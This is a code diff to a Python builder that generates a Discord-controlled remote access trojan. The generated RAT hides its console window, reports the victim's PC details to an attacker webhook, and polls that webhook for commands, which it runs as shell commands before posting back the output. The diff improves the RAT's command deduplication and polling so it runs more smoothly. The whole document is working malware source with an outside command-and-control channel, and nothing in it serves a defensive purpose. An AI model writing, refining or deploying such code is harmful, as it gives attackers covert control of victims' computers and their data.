@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Discord RAT Builder Module - Fixed
+# Discord RAT Builder Module - Fixed (No Spam)
 
 import os, sys, time, base64, random, string, platform, json, subprocess, re
 
@@ -26,12 +26,14 @@ def run():
     print("\n[+] Building Discord RAT...")
     
     code = f'''#!/usr/bin/env python3
-# Discord RAT - Controlled via Webhook
+# Discord RAT - Controlled via Webhook - No Spam
 
 import requests, subprocess, os, time, sys, platform, glob, re, base64, json, threading, ctypes, socket, getpass
 
 WEBHOOK = "{webhook}"
 IS_WIN = platform.system() == "Windows"
+PROCESSED_COMMANDS = set()
+LAST_CHECK = 0
 
 def send(data):
     try:
@@ -40,7 +42,7 @@ def send(data):
                 requests.post(WEBHOOK, json={{'content': data[i:i+1900]}})
         else:
             requests.post(WEBHOOK, json={{'content': data}})
-    except Exception as e:
+    except:
         pass
 
 def execute_cmd(cmd):
@@ -145,45 +147,55 @@ def persist_windows():
         pass
 
 def main():
+    global PROCESSED_COMMANDS, LAST_CHECK
+    
     if IS_WIN:
         try:
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
         except:
             pass
     
-    # Send connection notification
+    # Send connection notification once
     try:
         send("[+] RAT CONNECTED!")
         time.sleep(1)
         pc_info = get_pc_info()
         send(pc_info)
         send("[+] RAT ready. Type 'help' for commands")
-    except Exception as e:
-        send(f"[!] Startup error: {{str(e)}}")
-    
-    last_cmd = ""
-    last_cmd_time = 0
+    except:
+        pass
     
     while True:
         try:
-            # Check for commands - use GET to read webhook messages
+            # Only check every 3 seconds
+            current_time = time.time()
+            if current_time - LAST_CHECK < 3:
+                time.sleep(1)
+                continue
+            
+            LAST_CHECK = current_time
+            
+            # Get messages from webhook
             response = requests.get(WEBHOOK, timeout=5)
             
             if response.status_code == 200:
-                # Get the latest message from the webhook
                 try:
                     data = response.json()
-                    # Webhook messages are stored in the response
-                    # For discord webhooks, we need to check the content
                     if isinstance(data, list) and len(data) > 0:
-                        # Get the latest message
-                        latest = data[-1] if data else None
-                        if latest and 'content' in latest:
-                            cmd = latest['content'].strip()
-                            # Process command if it's new
-                            if cmd and cmd != last_cmd:
-                                last_cmd = cmd
+                        # Get latest message
+                        for msg in reversed(data[-5:]):  # Check last 5 messages
+                            if 'content' in msg:
+                                cmd = msg['content'].strip()
+                                cmd_id = msg.get('id', str(time.time()))
                                 
+                                # Skip if already processed
+                                if cmd_id in PROCESSED_COMMANDS:
+                                    continue
+                                
+                                # Mark as processed
+                                PROCESSED_COMMANDS.add(cmd_id)
+                                
+                                # Process command
                                 if cmd.startswith('shell '):
                                     result = execute_cmd(cmd[6:])
                                     send(result)
@@ -233,18 +245,16 @@ exit         - Stop the RAT"""
                                     sys.exit(0)
                                     
                                 else:
-                                    send(f"[!] Unknown command: {{cmd}}\\nType 'help' for commands")
+                                    # Only send unknown command if it's not empty
+                                    if cmd and len(cmd) > 0:
+                                        send(f"[!] Unknown command: {{cmd}}\\nType 'help' for commands")
                 except json.JSONDecodeError:
-                    # If response is not JSON, try to parse as text
-                    # Webhook responses can vary
                     pass
                 except Exception as e:
                     pass
             
-            time.sleep(5)
+            time.sleep(1)
             
-        except requests.exceptions.RequestException:
-            time.sleep(5)
         except Exception as e:
             time.sleep(5)
 
